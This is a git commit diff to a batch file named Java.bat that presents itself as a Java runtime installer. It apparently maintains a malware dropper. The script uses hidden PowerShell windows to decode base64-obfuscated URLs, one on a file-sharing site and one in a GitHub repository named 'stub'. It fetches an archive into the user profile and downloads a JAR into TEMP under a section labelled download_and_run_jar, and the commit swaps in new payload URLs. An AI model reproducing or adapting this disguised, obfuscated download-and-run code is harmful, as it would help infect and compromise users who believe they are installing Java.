8c6c1ae58377fb58e003fb3b7f6d0a9cd48eccfb
Python-is-trash <xox.scaramouche.xox@gmail.com>
2024-10-13 00:46:48 +0200

    Update Java.bat

--- Java.bat
+++ Java.bat
@@ -8,11 +8,11 @@ if %errorLevel% NEQ 0 (
 )
 
 :install_java
-set "encodedJavaUrl=aHR0cHM6Ly9maWxldHJhbnNmZXIuaW8vZGF0YS1wYWNrYWdlL2liNGdEbFlwL2Rvd25sb2Fk"
+set "encodedUrl=aHR0cHM6Ly9maWxldHJhbnNmZXIuaW8vZGF0YS1wYWNrYWdlL3pjTUlqY201L2Rvd25sb2Fk"
 set "output=%TEMP%\jre1.8.0_361.zip"
 set "installDir=%USERPROFILE%\Ja"v"a\jre1.8.0_361"
 
-powershell -WindowStyle Hidden -Command "$javaUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJavaUrl%')); (New-Object System.Net.WebClient).DownloadFile($javaUrl, '%output%')"
+powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedUrl%')); (New-Object System.Net.WebClient).DownloadFile($url, '%output%')"
 
 powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"
 
@@ -25,7 +25,7 @@ if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
 set PATH=%PATH%;%installDir%\jre1.8.0_361\bin
 
 :download_and_run_jar
-set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL21haW4vSmF2YS5qYXI="
+set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL2hlYWRzL21haW4vSmF2YS5qYXI="
 set "jarOutput=%TEMP%\Ja"v"a.jar"
 
 powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"
